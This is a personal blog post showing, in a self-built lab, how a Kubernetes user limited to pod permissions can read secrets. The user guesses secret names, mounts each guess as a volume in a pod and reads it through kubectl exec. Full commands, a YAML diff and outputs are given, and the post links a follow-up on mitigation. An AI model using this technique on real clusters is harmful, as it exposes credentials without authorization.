<!doctype html>
<html lang="en">
  <head>
  <meta charset="utf-8">
<title>Access Any Kubernetes Secret - Suraj Deshmukh</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<meta name="generator" content="Hugo 0.80.0" /><meta property="og:site_name" content="Suraj Deshmukh">
  <meta property="og:title" content="Access Any Kubernetes Secret">
  <meta property="og:description" content="A little trickery and access any Kubernetes Secret!">
  <meta property="description" content="A little trickery and access any Kubernetes Secret!">
  <meta property="og:url" content="https://suraj.io/post/2021/05/access-k8s-secrets/">
  <meta property="og:type" content="article">
  
    
      <meta property="og:image" content="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg">
      <meta property="og:image:alt" content="Forbidden">
    
  
  
            <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/github.min.css">
          <link rel="stylesheet" href="/css/bundle.min.307f33cd8015e5bab28d6ebda9b400f8d3059bc248b4e60adf4d23469fab5a2b.css" integrity="sha256-MH8zzYAV5bqyjW69qbQA&#43;NMFm8JItOYK300jRp&#43;rWis="><link rel="stylesheet" href="/css/add-on.css">
</head>

  <body>
    

<header id="site-header">
  <nav id="site-nav">
    <h1 class="nav-title">
      <a href="/" class="nav">
        
          Access Any Kubernetes Secret
        
      </a>
    </h1>
    <menu id="site-nav-menu" class="flyout-menu menu">
      
        
          
          <a href="/" class="nav link"><i class='fa fa-home'></i> Home</a>
        
      
        
          
          <a href="/about/" class="nav link"><i class='far fa-id-card'></i> About</a>
        
      
        
          
          <a href="/post/" class="nav link"><i class='far fa-newspaper'></i> Blog</a>
        
      
        
          
          <a href="/categories/" class="nav link"><i class='fas fa-sitemap'></i> Categories</a>
        
      
      <a href="#share-menu" class="nav link share-toggle"><i class="fas fa-share-alt">&nbsp;</i>Share</a>
      <a href="#search-input" class="nav link search-toggle"><i class="fas fa-search">&nbsp;</i>Search</a>
    </menu>
    <a href="#search-input" class="nav search-toggle"><i class="fas fa-search fa-2x">&nbsp;</i></a>
    <a href="#share-menu" class="nav share-toggle"><i class="fas fa-share-alt fa-2x">&nbsp;</i></a>
    <a href="#lang-menu" class="nav lang-toggle" lang="en">en</a>
    <a href="#site-nav" class="nav nav-toggle"><i class="fas fa-bars fa-2x"></i></a>
  </nav>
  <menu id="search" class="menu"><input id="search-input" class="search-input menu"></input><div id="search-results" class="search-results menu"></div></menu>
  <menu id="lang-menu" class="flyout-menu menu">
  <a href="#" lang="en" class="nav link active">English (en)</a>
  
    
      
    
  
</menu>

  
    <menu id="share-menu" class="flyout-menu menu">
      <h1>Share Post</h1>
      




  
    
    <a href="//twitter.com/share?text=Access%20Any%20Kubernetes%20Secret&amp;url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" rel="noopener" class="nav share-btn twitter">
        <p>Twitter</p>
      </a>
  

  
    <a href="//www.reddit.com/submit?url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f&amp;title=Access%20Any%20Kubernetes%20Secret" target="_blank" rel="noopener" class="nav share-btn reddit">
          <p>Reddit</p>
        </a>
  

  
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f&amp;title=Access%20Any%20Kubernetes%20Secret" target="_blank" rel="noopener" class="nav share-btn linkedin">
            <p>LinkedIn</p>
          </a>
  

  
      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" rel="noopener" class="nav share-btn facebook">
        <p>Facebook</p>
        </a>
  

  
        <a href="mailto:?subject=Check%20out%20this%20post%20by Suraj%20Deshmukh&amp;body=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" class="nav share-btn email" data-proofer-ignore>
          <p>Email</p>
        </a>
  


    </menu>
  
</header>

    <div id="wrapper">
      <section id="site-intro" >
  <a href="/"><img src="https://github.com/surajssd.png" class="square" width="100" alt="Suraj Deshmukh" /></a>
  <header>
    <h1>Blog</h1>
  </header>
  <main>
    <p>containers, packaging, programming, hacks, kubernetes, openshift, fedora, centos</p>
  </main>
  
    <footer>
      <ul class="socnet-icons">
        

        <li><a href="//github.com/surajssd" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>

<li><a href="//stackoverflow.com/users/3848679/surajd" target="_blank" rel="noopener" title="Stack Overflow" class="fab fa-stack-overflow"></a></li>







<li><a href="//deshmukhsuraj.wordpress.com" target="_blank" rel="noopener" title="WordPress" class="fab fa-wordpress"></a></li>

<li><a href="//www.linkedin.com/in/suraj-deshmukh-0205b834" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>



<li><a href="//slideshare.com/surajssd009005" target="_blank" rel="noopener" title="SlideShare" class="fab fa-slideshare"></a></li>



<li><a href="//youtube.com/surajssd009005" target="_blank" rel="noopener" title="YouTube" class="fab fa-youtube"></a></li>







<li><a href="//twitter.com/surajd_" target="_blank" rel="noopener" title="Twitter" class="fab fa-twitter"></a></li>











<li><a href="mailto:surajd.service@gmail.com" target="_blank" title="Email" class="far fa-envelope"></a></li>

      </ul>
    </footer>
  
</section>

      <main id="site-main">
        
  <article>
    <div class="post">
      <header>
  <div class="title">
    
      <h2><a href="/post/2021/05/access-k8s-secrets/">Access Any Kubernetes Secret</a></h2>
    
    
      <p>A little trickery and access any Kubernetes Secret!</p>
    
  </div>
  <div class="meta">
    <time datetime="2021-05-08 12:17:07 &#43;0530 IST">May 8, 2021</time>
    <p>Suraj Deshmukh</p>
    <p>5-Minute Read</p>
  </div>
</header>

      <div id="socnet-share">
        




  
    
    <a href="//twitter.com/share?text=Access%20Any%20Kubernetes%20Secret&amp;url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" rel="noopener" class="nav share-btn twitter">
        <p>Twitter</p>
      </a>
  

  
    <a href="//www.reddit.com/submit?url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f&amp;title=Access%20Any%20Kubernetes%20Secret" target="_blank" rel="noopener" class="nav share-btn reddit">
          <p>Reddit</p>
        </a>
  

  
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f&amp;title=Access%20Any%20Kubernetes%20Secret" target="_blank" rel="noopener" class="nav share-btn linkedin">
            <p>LinkedIn</p>
          </a>
  

  
      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" rel="noopener" class="nav share-btn facebook">
        <p>Facebook</p>
        </a>
  

  
        <a href="mailto:?subject=Check%20out%20this%20post%20by Suraj%20Deshmukh&amp;body=https%3a%2f%2fsuraj.io%2fpost%2f2021%2f05%2faccess-k8s-secrets%2f" target="_blank" class="nav share-btn email" data-proofer-ignore>
          <p>Email</p>
        </a>
  


      </div>
      <div class="content">
        <a href="/post/2021/05/access-k8s-secrets/" class="image" style="--bg-image: url('https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg');">
    <img src="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg" alt="Forbidden">
  </a>
        <p>Photo by <a href="%22https://unsplash.com/@kylejglenn%22">Kyle Glenn</a> on <a href="%22https://unsplash.com%22">Unsplash</a>.</p>
<p>You can gain access to any secret that you want in Kubernetes even if you don&rsquo;t have RBAC permissions to get, list or view that secret. All you need is permission that allows you to do anything on pods and an ability to guess the names of secrets. With these two ingredients, here is how you can access any secret out there.</p>
<h2 id="nasty-user">Nasty User</h2>
<p>Here is a user called <code>nastyuser</code> who can only do stuff on pod objects. Everything else is forbidden.
The user cannot list secrets, namespaces or deployments:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get ns
Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: namespaces is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;namespaces&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> at the cluster scope

$ kubectl get secrets
Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: secrets is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;secrets&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>

$ kubectl get deploy
Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: deployments.apps is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;deployments&#34;</span> in API group <span style="color:#e6db74">&#34;apps&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>
</code></pre></div><p>The user has access to <code>pods</code> and <code>pods/exec</code> and a bunch of other things that are required for a user to have functional access to the Kubernetes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
pods/exec                                       <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
pods                                            <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/api/*<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/api<span style="color:#f92672">]</span>              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/apis/*<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/apis<span style="color:#f92672">]</span>             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/openapi/*<span style="color:#f92672">]</span>        <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/openapi<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
</code></pre></div><p><strong>NOTE:</strong> You will need at least <code>pods/exec</code> or <code>pods/logs</code> to see the content of the secret using the generic bash tools. If you don&rsquo;t have this extra permission, you can create a script that reads contents and uploads the contents somewhere, which you can access from over the web. For the sake of simplicity, I chose <code>pods/exec</code> as extra permission.</p>
<p><strong>NOTE:</strong> How you gain access to a kubeconfig that has the aforementioned authorisation is out of the scope of this blog. It is possible to gain access somehow to the host and fortuitously gain access to the service account token secret that has previously mentioned permissions.</p>
<h2 id="do-what-you-can">Do what you can!</h2>
<p>Now how do you gain access to secrets with RBAC permissions only for pods? Your social skills and guesswork is going to help you find the name of the secrets. But even if you guess the name of the secret, you cannot access the secret the kubectl way since RBAC won&rsquo;t let you do that. So you will use the only permission you have on the Kubernetes cluster, which is creating pods.</p>
<blockquote>
<p>If you don&rsquo;t have access to the Kubernetes secret but know the name of the Kubernetes secret, you can simply</p>
<ol>
<li>Create a pod.</li>
<li>Mount that secret into the pod.</li>
<li>Kubelet will happily give it to you regardless of your RBAC permissions to access the secret.</li>
</ol>
</blockquote>
<p>Let&rsquo;s see that in action. Start by creating a dummy pod config:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">$ kubectl run sleep --image=fedora --dry-run=client -o yaml -- sleep infinity &gt; pod.yaml</span>
<span style="color:#ae81ff">$ cat pod.yaml</span>
<span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
<span style="color:#f92672">metadata</span>:
  <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
  <span style="color:#f92672">labels</span>:
    <span style="color:#f92672">run</span>: <span style="color:#ae81ff">sleep</span>
  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
<span style="color:#f92672">spec</span>:
  <span style="color:#f92672">containers</span>:
  - <span style="color:#f92672">args</span>:
    - <span style="color:#ae81ff">sleep</span>
    - <span style="color:#ae81ff">infinity</span>
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">fedora</span>
    <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
    <span style="color:#f92672">resources</span>: {}
  <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
  <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
<span style="color:#f92672">status</span>: {}
</code></pre></div><p>Now add the following changes to the config. Here we are mounting a secret inside the pod at path <code>/access-secret</code>. Once the pod is up and running, we will find the mounted secret in this directory. We will replace the <code>secretName</code> field value from <code>GUESSED_SECRET</code> with something else as we keep on guessing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">diff --git pod.yaml pod.yaml
index 479a53d..2376fe3 100644
<span style="color:#f92672">--- pod.yaml
</span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ pod.yaml
</span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -13,6 +13,13 @@ spec:
</span><span style="color:#75715e"></span>     image: fedora
     name: sleep
     resources: {}
<span style="color:#a6e22e">+    volumeMounts:
</span><span style="color:#a6e22e">+    - name: hackedsecret
</span><span style="color:#a6e22e">+      mountPath: /access-secret/
</span><span style="color:#a6e22e"></span>   dnsPolicy: ClusterFirst
   restartPolicy: Always
<span style="color:#a6e22e">+  volumes:
</span><span style="color:#a6e22e">+  - name: hackedsecret
</span><span style="color:#a6e22e">+    secret:
</span><span style="color:#a6e22e">+      secretName: GUESSED_SECRET
</span><span style="color:#a6e22e"></span> status: {}
</code></pre></div><h2 id="attempt-1st">Attempt 1st</h2>
<p>Use <code>sed</code> to replace the string <code>GUESSED_SECRET</code> and create the pod out of it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|admin|g&#39;</span> pod.yaml | kubectl create -f -
pod/sleep created
</code></pre></div><p>Now check the pod:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get pods
NAME    READY   STATUS              RESTARTS   AGE
sleep   0/1     ContainerCreating   <span style="color:#ae81ff">0</span>          96s
</code></pre></div><p>The pod is in <code>ContainerCreating</code> state for more than a minute that means the secret does not exist, and Kubelet is failing to mount it in the pod. Describing the pod won&rsquo;t tell us anything because we don&rsquo;t have access to the events.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl describe pod sleep | tail -3
Tolerations:     node.kubernetes.io/not-ready:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
                 node.kubernetes.io/unreachable:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
Events:          &lt;none&gt;
</code></pre></div><p>Cleanup by running the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl delete pod sleep
pod <span style="color:#e6db74">&#34;sleep&#34;</span> deleted
</code></pre></div><h2 id="attempt-nth">Attempt nth</h2>
<p>Let&rsquo;s try a different secret name:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|supersecret|g&#39;</span> pod.yaml | kubectl create -f -
pod/sleep created
</code></pre></div><p>Let&rsquo;s check the pod status:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get pods
NAME    READY   STATUS    RESTARTS   AGE
sleep   1/1     Running   <span style="color:#ae81ff">0</span>          32s
</code></pre></div><p>Yay, that means we guessed the secret name correctly. Let&rsquo;s gain access to the pod&rsquo;s terminal to find out the contents of the secrets:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl exec -it sleep bash
kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> is DEPRECATED and will be removed in a future version. Use kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> -- <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> instead.
<span style="color:#f92672">[</span>root@sleep /<span style="color:#f92672">]</span><span style="color:#75715e">#</span>
</code></pre></div><p>Now go to the place where the secret is mounted and discover what is in secret.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>root@sleep ~<span style="color:#f92672">]</span><span style="color:#75715e"># cd /access-secret/</span>
<span style="color:#f92672">[</span>root@sleep access-secret<span style="color:#f92672">]</span><span style="color:#75715e"># cat data</span>
supersecretvaluesinhere
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>This post was from the perspective of an attacker. It showed you how you could use guessing the secret name to gain access to any secret you like, of course, with the help of Kubelet.</p>
<p>In the <a href="https://suraj.io/post/2021/05/access-k8s-secrets-mitigation/">next blog</a>, we will see how to detect this issue and stop it from happening.</p>
<h2 id="background-setup">Background Setup</h2>
<p>I used the following commands to create a user and assign permissions to that user:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kubectl create role pod-all --verb<span style="color:#f92672">=</span>* --resource<span style="color:#f92672">=</span>pods --resource<span style="color:#f92672">=</span>pods/exec
kubectl create rolebinding pod-all:nastyuser --role<span style="color:#f92672">=</span>pod-all --user<span style="color:#f92672">=</span>nastyuser
kubectl create secret generic supersecret --from-literal data<span style="color:#f92672">=</span>supersecretvaluesinhere
alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl --as=nastyuser&#39;</span>
</code></pre></div>
      </div>
      <footer>
        <div class="stats">
  
    <ul class="categories">
      
        
          <li><a class="article-terms-link" href="/categories/kubernetes/">kubernetes</a></li>
        
          <li><a class="article-terms-link" href="/categories/security/">security</a></li>
        
      
    </ul>
  
  
    <ul class="tags">
      
        
          <li><a class="article-terms-link" href="/tags/kubernetes/">kubernetes</a></li>
        
          <li><a class="article-terms-link" href="/tags/security/">security</a></li>
        
      
    </ul>
  
</div>

      </footer>
    </div>
    
      
  <div class='post'>
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "suraj-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>



    
  </article>
  <div class="pagination">
    
      <a href="/post/2021/05/access-k8s-secrets-mitigation/" class="button left"><span>Mitigation of: Access Any Kubernetes Secret</span></a>
    
    
      <a href="/post/2021/04/rituals-dont-scale/" class="button right"><span>Religious Rituals Don&#39;t Scale With Population</span></a>
    
  </div>

      </main>
      <section id="site-sidebar">
  
    <section id="recent-posts">
      <header>
        <h1>Recent Posts</h1>
      </header>
      
      <article class="mini-post">
          <a href="/post/2021/05/learnings-psychology-of-money/" class="image" style="--bg-image: url('https://suraj.io/post/2021/05/learnings-psychology-of-money/logo.jpg');">
    <img src="https://suraj.io/post/2021/05/learnings-psychology-of-money/logo.jpg" alt="TPOM">
  </a>
        <header>
          <h2><a href="/post/2021/05/learnings-psychology-of-money/">Learnings from &#39;The Psychology of Money&#39;</a></h2>
          <time class="published" datetime="2021-05-20 12:15:07 &#43;0530 IST">May 20, 2021</time>
        </header>
      </article>
      
      <article class="mini-post">
          <a href="/post/2021/05/access-k8s-secrets-mitigation/" class="image" style="--bg-image: url('https://suraj.io/post/2021/05/access-k8s-secrets-mitigation/config.png');">
    <img src="https://suraj.io/post/2021/05/access-k8s-secrets-mitigation/config.png" alt="Config">
  </a>
        <header>
          <h2><a href="/post/2021/05/access-k8s-secrets-mitigation/">Mitigation of: Access Any Kubernetes Secret</a></h2>
          <time class="published" datetime="2021-05-20 08:47:07 &#43;0530 IST">May 20, 2021</time>
        </header>
      </article>
      
      <article class="mini-post">
          <a href="/post/2021/05/access-k8s-secrets/" class="image" style="--bg-image: url('https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg');">
    <img src="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg" alt="Forbidden">
  </a>
        <header>
          <h2><a href="/post/2021/05/access-k8s-secrets/">Access Any Kubernetes Secret</a></h2>
          <time class="published" datetime="2021-05-08 12:17:07 &#43;0530 IST">May 8, 2021</time>
        </header>
      </article>
      
      <article class="mini-post">
          <a href="/post/2021/04/rituals-dont-scale/" class="image" style="--bg-image: url('https://suraj.io/post/2021/04/rituals-dont-scale/earth.jpg');">
    <img src="https://suraj.io/post/2021/04/rituals-dont-scale/earth.jpg" alt="Earth">
  </a>
        <header>
          <h2><a href="/post/2021/04/rituals-dont-scale/">Religious Rituals Don&#39;t Scale With Population</a></h2>
          <time class="published" datetime="2021-04-12 07:07:07 &#43;0530 IST">April 12, 2021</time>
        </header>
      </article>
      
      <article class="mini-post">
          <a href="/post/2021/03/node-monitor/" class="image" style="--bg-image: url('https://suraj.io/post/2021/03/node-monitor/node-exporter-2.png');">
    <img src="https://suraj.io/post/2021/03/node-monitor/node-exporter-2.png" alt="Node Exporter">
  </a>
        <header>
          <h2><a href="/post/2021/03/node-monitor/">Monitor your PC with Prometheus Grafana stack</a></h2>
          <time class="published" datetime="2021-04-02 07:07:07 &#43;0530 IST">April 2, 2021</time>
        </header>
      </article>
      
      
        <footer>
          <a href="/post/" class="button">See More</a>
        </footer>
      
    </section>
  

  
    

      <section id="categories">
        <header>
          <h1><a href="/categories">Categories</a></h1>
        </header>
        <ul>
          
          
          <li>
              <a href="/categories/kubernetes/">kubernetes<span class="count">30</span></a>
          
          <li>
              <a href="/categories/notes/">notes<span class="count">21</span></a>
          
          <li>
              <a href="/categories/non-tech/">non-tech<span class="count">12</span></a>
          
          <li>
              <a href="/categories/security/">security<span class="count">10</span></a>
          
          <li>
              <a href="/categories/productivity/">productivity<span class="count">8</span></a>
          
          <li>
              <a href="/categories/book-review/">book-review<span class="count">7</span></a>
          
          <li>
              <a href="/categories/containers/">containers<span class="count">7</span></a>
          
          <li>
              <a href="/categories/bash/">bash<span class="count">5</span></a>
          
          <li>
              <a href="/categories/event_report/">event_report<span class="count">5</span></a>
          
          <li>
              <a href="/categories/packaging/">packaging<span class="count">5</span></a>
          
          <li>
              <a href="/categories/docker/">docker<span class="count">4</span></a>
          
          <li>
              <a href="/categories/golang/">golang<span class="count">4</span></a>
          
          <li>
              <a href="/categories/host/">host<span class="count">4</span></a>
          
          <li>
              <a href="/categories/fedora/">fedora<span class="count">3</span></a>
          
          <li>
              <a href="/categories/kompose/">kompose<span class="count">3</span></a>
          
          <li>
              <a href="/categories/linux/">linux<span class="count">3</span></a>
          
          <li>
              <a href="/categories/monitoring/">monitoring<span class="count">3</span></a>
          
          <li>
              <a href="/categories/notion/">notion<span class="count">3</span></a>
          
          <li>
              <a href="/categories/openshift/">openshift<span class="count">3</span></a>
          
          <li>
              <a href="/categories/programming/">programming<span class="count">3</span></a>
          
          <li>
              <a href="/categories/prometheus/">prometheus<span class="count">3</span></a>
          
          <li>
              <a href="/categories/certs/">certs<span class="count">2</span></a>
          
          <li>
              <a href="/categories/cka/">cka<span class="count">2</span></a>
          
          <li>
              <a href="/categories/configuration/">configuration<span class="count">2</span></a>
          
          <li>
              <a href="/categories/desktop/">desktop<span class="count">2</span></a>
          
          <li>
              <a href="/categories/git/">git<span class="count">2</span></a>
          
          <li>
              <a href="/categories/ide/">ide<span class="count">2</span></a>
          
          <li>
              <a href="/categories/kms/">kms<span class="count">2</span></a>
          
          <li>
              <a href="/categories/minikube/">minikube<span class="count">2</span></a>
          
          <li>
              <a href="/categories/activism/">activism<span class="count">1</span></a>
          
          <li>
              <a href="/categories/backup/">backup<span class="count">1</span></a>
          
          <li>
              <a href="/categories/centos/">centos<span class="count">1</span></a>
          
          <li>
              <a href="/categories/cmd-line/">cmd-line<span class="count">1</span></a>
          
          <li>
              <a href="/categories/etcd/">etcd<span class="count">1</span></a>
          
          <li>
              <a href="/categories/flatcar/">flatcar<span class="count">1</span></a>
          
          <li>
              <a href="/categories/gaming/">gaming<span class="count">1</span></a>
          
          <li>
              <a href="/categories/gnome/">gnome<span class="count">1</span></a>
          
          <li>
              <a href="/categories/https/">https<span class="count">1</span></a>
          
          <li>
              <a href="/categories/jobs/">jobs<span class="count">1</span></a>
          
          <li>
              <a href="/categories/kubeadm/">kubeadm<span class="count">1</span></a>
          
          <li>
              <a href="/categories/lokomotive/">lokomotive<span class="count">1</span></a>
          
          <li>
              <a href="/categories/meetup/">meetup<span class="count">1</span></a>
          
          <li>
              <a href="/categories/project_management/">project_management<span class="count">1</span></a>
          
          <li>
              <a href="/categories/selinux/">selinux<span class="count">1</span></a>
          
          <li>
              <a href="/categories/talks/">talks<span class="count">1</span></a>
          
          <li>
              <a href="/categories/vagrant/">vagrant<span class="count">1</span></a>
          
          </li>
        </ul>
      </section>
    
  

  
    <section id="mini-bio">
      <header>
        <h1>About</h1>
      </header>
      <p>I am a Software Engineer at Kinvolk, working on various tooling around container technology like Docker, Kubernetes.</p>
      <footer>
        <a href="/about" class="button">Learn More</a>
      </footer>
    </section>
  
</section>

      <footer id="site-footer">
  
      <ul class="socnet-icons">
        

        <li><a href="//github.com/surajssd" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>

<li><a href="//stackoverflow.com/users/3848679/surajd" target="_blank" rel="noopener" title="Stack Overflow" class="fab fa-stack-overflow"></a></li>







<li><a href="//deshmukhsuraj.wordpress.com" target="_blank" rel="noopener" title="WordPress" class="fab fa-wordpress"></a></li>

